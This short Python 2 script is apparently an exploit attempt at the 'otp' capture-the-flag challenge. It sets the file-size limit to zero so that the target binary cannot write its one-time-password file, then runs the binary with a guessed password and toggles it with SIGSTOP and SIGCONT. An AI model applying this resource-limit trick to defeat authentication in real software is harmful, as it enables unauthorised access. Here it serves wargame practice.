import subprocess
import signal
import resource
import sys
import time 

resource.setrlimit(resource.RLIMIT_FSIZE, (0,0))
#print resource.getrlimit(resource.RLIMIT_FSIZE)


def signal_handler(sig_num, frame):
	#print sys.exc_info()
	print frame.f_exc_traceback

#signal.signal(signal.SIGXFSZ, signal.SIG_IGN)# signal_handler)
signal.signal(signal.SIGCHLD, signal_handler)
p = subprocess.Popen(['/home/raw/Documents/pwnable/rookis/otp/otp', '12345678'], stderr=subprocess.STDOUT)

p.send_signal(signal.SIGSTOP)
time.sleep(2)
p.send_signal(signal.SIGCONT)


while(True):
	pass

